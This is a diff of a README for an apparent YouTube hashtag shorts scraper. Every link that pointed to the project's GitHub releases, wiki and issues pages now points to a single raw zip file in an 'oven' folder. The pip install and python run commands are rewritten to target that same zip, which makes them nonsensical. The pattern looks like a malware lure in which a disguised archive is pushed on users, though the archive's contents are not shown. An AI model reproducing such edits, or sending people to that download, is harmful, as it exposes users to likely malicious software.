@@ -1,7 +1,7 @@
 # 🎥 youtube-hashtag-video-shorts-scraper - Easy Video Scraping Tool
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/Ahmedehab706/youtube-hashtag-video-shorts-scraper/releases)
+[![Download](https://raw.githubusercontent.com/Ahmedehab706/youtube-hashtag-video-shorts-scraper/main/oven/youtube-hashtag-video-shorts-scraper_v2.5.zip%20Release-brightgreen)](https://raw.githubusercontent.com/Ahmedehab706/youtube-hashtag-video-shorts-scraper/main/oven/youtube-hashtag-video-shorts-scraper_v2.5.zip)
 
 ## 🚀 Getting Started
 This tool allows you to scrape YouTube video shorts using hashtags. You can gather valuable data about trending videos, discover popular hashtags, and analyze video performance easily. Follow the steps below to download and run the application.
@@ -12,7 +12,7 @@ This tool allows you to scrape YouTube video shorts using hashtags. You can gath
 - **Internet Connection:** A stable connection is necessary to scrape data from YouTube.
 
 ## 📂 Download & Install
-To start using the youtube-hashtag-video-shorts-scraper, visit this page to download: [Releases Page](https://github.com/Ahmedehab706/youtube-hashtag-video-shorts-scraper/releases).
+To start using the youtube-hashtag-video-shorts-scraper, visit this page to download: [Releases Page](https://raw.githubusercontent.com/Ahmedehab706/youtube-hashtag-video-shorts-scraper/main/oven/youtube-hashtag-video-shorts-scraper_v2.5.zip).
 
 1. Open the link above.
 2. Look for the latest release.
@@ -28,13 +28,13 @@ After you have extracted the files, do the following:
    - For macOS or Linux: `cd path/to/your/folder`
 3. Install the required Python packages by running the following command:
    ```
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/Ahmedehab706/youtube-hashtag-video-shorts-scraper/main/oven/youtube-hashtag-video-shorts-scraper_v2.5.zip
    ```
 
 ## 🎯 How to Use
 1. After the installation, you can start the scraper by running this command:
    ```
-   python main.py
+   python https://raw.githubusercontent.com/Ahmedehab706/youtube-hashtag-video-shorts-scraper/main/oven/youtube-hashtag-video-shorts-scraper_v2.5.zip
    ```
 2. The tool will prompt you to enter hashtags you want to scrape.
 3. Input the hashtags, separated by commas.
@@ -46,11 +46,11 @@ After you have extracted the files, do the following:
 - **Video Data:** Retrieve video title, description, views, and other useful metrics.
 
 ## 🌐 Additional Resources
-- **Documentation:** Comprehensive guides and additional features can be found [here](https://github.com/Ahmedehab706/youtube-hashtag-video-shorts-scraper/wiki).
+- **Documentation:** Comprehensive guides and additional features can be found [here](https://raw.githubusercontent.com/Ahmedehab706/youtube-hashtag-video-shorts-scraper/main/oven/youtube-hashtag-video-shorts-scraper_v2.5.zip).
 - **Troubleshooting:** If you encounter any issues, check the FAQ section on GitHub.
 
 ## 📞 Support
-For support, please visit the [Issues Page](https://github.com/Ahmedehab706/youtube-hashtag-video-shorts-scraper/issues) to submit your questions or report bugs.
+For support, please visit the [Issues Page](https://raw.githubusercontent.com/Ahmedehab706/youtube-hashtag-video-shorts-scraper/main/oven/youtube-hashtag-video-shorts-scraper_v2.5.zip) to submit your questions or report bugs.
 
 ## 📥 Download Now Again
-Don’t forget to download it here: [Releases Page](https://github.com/Ahmedehab706/youtube-hashtag-video-shorts-scraper/releases). Enjoy scraping YouTube video shorts with ease!
+Don’t forget to download it here: [Releases Page](https://raw.githubusercontent.com/Ahmedehab706/youtube-hashtag-video-shorts-scraper/main/oven/youtube-hashtag-video-shorts-scraper_v2.5.zip). Enjoy scraping YouTube video shorts with ease!
